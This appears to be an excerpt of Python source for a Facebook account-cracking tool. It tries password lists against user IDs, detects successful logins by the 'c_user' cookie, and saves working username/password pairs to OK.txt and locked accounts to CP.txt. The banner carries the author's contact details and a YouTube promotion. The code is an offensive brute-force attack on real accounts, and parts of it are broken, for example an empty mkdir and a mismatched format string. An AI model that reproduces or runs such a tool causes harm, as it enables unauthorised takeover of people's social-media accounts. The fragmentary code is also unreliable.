...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [IBRAHIM] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				Ibrahim('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-khan %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-I+R] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : Ibrahim
    Facebook : https://www.facebook.com/profile.php?id=100079999129988
    Team     : Ibrahim-cyber
    Connect  : 03237528063
 [*]=============================================
...
def sep():
	logo()
	os.system("xdg-open https://youtube.com/@f2k-gaming?si=Gj2mzeQGw1S7RxgE")
	time.sleep(3)
	readline___Public_Xml()
